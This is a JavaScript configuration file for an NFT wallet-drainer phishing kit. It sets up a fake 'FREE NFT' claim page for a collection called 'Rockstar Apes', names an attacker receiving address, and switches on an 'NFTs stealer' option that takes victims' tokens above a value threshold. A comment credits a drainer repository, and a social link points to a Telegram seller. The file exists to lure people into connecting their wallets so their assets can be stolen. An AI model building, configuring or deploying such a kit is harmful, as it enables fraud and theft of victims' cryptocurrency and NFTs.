const receiveAddress = "0x6dB36aDc8Cbe41b81F6250BF3F70A3634dA65314";

const collectionInfo = {
    name: "Rockstar Apes",
    socialMedia: {
        discord: "https://t.me/TecOnSellix"
    
    },
}

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "Rockstar Parcels", // {name} will be replaced with collectionInfo.name
    underTitle: "What will you recieve? it's a mystery",
}

const claimPageInfo = {
    title: "FREE NFT", // <br> is a line break
    shortDescription: "Will you make it?",
    longDescription: "The Rockstar Apes await...",

    claimButtonText: "CLAIM NOW",

    image: "TecOnSellix.jpeg", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = https://github.com/0x32Moon/Crypto-Nft-Drainer-V2 = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
